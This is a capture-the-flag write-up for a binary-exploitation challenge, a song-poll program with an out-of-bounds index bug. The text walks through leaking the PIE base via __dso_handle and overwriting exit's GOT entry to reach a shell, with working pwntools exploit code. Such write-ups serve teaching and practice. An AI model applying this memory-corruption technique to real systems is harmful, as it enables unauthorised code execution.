# OOB

## Solution

Here is a basic showing of how the program typically executes:
```
------------------------------------------------
 Best Song Poll v31337                          
------------------------------------------------
0: Yesterday
1: Every Breath You Take
2: Imagine
3: One
------------------------------------------------

Which song would you like to vote for [0-3] >>> 0
<<< An Excellent Choice: Yesterday
```
Suppose that we gave the program a value not within the proper bounds:
```
------------------------------------------------
 Best Song Poll v31337                          
------------------------------------------------
0: Yesterday
1: Every Breath You Take
2: Imagine
3: One
------------------------------------------------

Which song would you like to vote for [0-3] >>> 4
<<< I do not recognize #4: 0x7fc71641f780
What is the song title for #4 >>> test
Segmentation fault (core dumped)
```
Hence, it appears that we can, by providing invalid indices, write and read arbitrary memory. Thus, the initial idea that we have is to use this to overwrite the plt. This will allow us to execute an arbitrary function of our choice. Specifically, in the binary, we notice an `admin` function that uses `system` to call `/bin/sh`:
```python
def overwrite_plt(p):
    log.info("Overwriting plt...")
    offset = (e.got['exit'] - e.sym['songs'])//8
    log.info(f"Using offset {offset}")
    admin = e.sym['admin']
    p.sendlineafter(b"[0-3] >>>", str(offset).encode('utf-8'))
    p.sendlineafter(f"#{offset} >>>".encode('utf-8'), p64(admin))
```
There is one problem with this strategy: the binary has PIE enabled. Thus, in order for this exploit to work, we need to determine the base address of the exploit. To do this, we hope to use the vulnerability to read from memory. The only issue is that we read a value that is pointed at by the spot in memory. Thus, we need to be clever to figure out what to leak. Luckily, the binary has the following:
```
00003548  void* __dso_handle = __dso_handle
```
This is a value that points to itself. We can use this to determine the base address:
```python
def find_base(p):
    log.info("Determining the base address...")
    diff = (e.sym['__dso_handle'] - e.sym['songs'])//8
    log.info(f"Using offset {diff}")
    p.sendlineafter(b"[0-3] >>>", str(diff).encode('utf-8'))
    p.recvuntil(f"#{diff}: 0x".encode('utf-8'))
    leak = int(p.recv(12), 16)
    p.sendlineafter(f"#{diff} >>>".encode('utf-8'), p64(leak))
    return leak - e.sym['__dso_handle']
```
Finally, we can put all this together to create the exploit:
```python
p = start()

e.address = find_base(p)
log.info(f"Found base of binary at {hex(e.address)}")
pause()

overwrite_plt(p)
p.sendlineafter(b"[0-3] >>>", b"0")
p.interactive()
```